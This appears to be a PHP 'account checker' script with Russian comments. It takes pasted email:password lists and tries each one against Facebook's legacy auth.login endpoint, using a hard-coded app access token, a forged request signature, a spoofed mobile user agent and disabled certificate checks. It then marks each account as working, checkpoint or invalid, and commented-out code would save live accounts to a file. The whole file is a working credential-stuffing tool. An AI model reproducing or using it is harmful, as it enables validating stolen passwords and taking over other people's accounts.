<?php
/**
 * Created by PhpStorm.
 * User: m0pfin
 * Date: 19.01.2020
 * Time: 14:52
 * Edit: @m0pfin

ini_set('error_reporting', E_ALL);
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
 */


$argv[1] = $_POST['acc'];
//$gen  = rand(); // Генерируем случайное число
//$name = 'live_'.$gen.'.txt'; // Генерируем случайное имя для файла

if(!empty($argv[1])) {
    if(isset($argv[1])) {
        $ambil = explode(PHP_EOL, $argv[1]);
        foreach($ambil as $targets) {
            $potong = explode(":", $targets);
            cekAkunFb($potong[0], $potong[1]); // чтобы писать в файл добавить $name
        }
        //echo 'Скачать файл с живыми акками: <a href="'.$name.'">Скачать</a><br>';

    }else die("Поле не может быть пустым");
}else die("Поле не может быть пустым!");

function cekAkunFb($email, $passwd) { // чтобы писать в файл добавить $name

    $data = array(
        "access_token" => "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
        "email" => $email,
        "password" => $passwd,
        "locale" => "en_US",
        "format" => "JSON"
    );
    $sig = "";
    foreach($data as $key => $value) { $sig .= $key."=".$value; }
    $sig = md5($sig);
    $data['sig'] = $sig;

    $ch = curl_init("https://api.facebook.com/method/auth.login");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, "Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10");
    $result = json_decode(curl_exec($ch));

    $empas = $email.":".$passwd;
    if(isset($result->access_token)) {
        echo $empas." - <font color='green'>Работает</font>".PHP_EOL.'<br>';
        //file_put_contents($name, $empas.PHP_EOL);
    }elseif($result->error_code == 405 || preg_match("/User must verify their account/i", $result->error_msg)) {
        echo $empas." - <font color='#ffa07a'>Чекпойнт</font>".PHP_EOL.'<br>';
    }else echo $empas." - <font color='red'>Невалид</font>".PHP_EOL.'<br>';

}
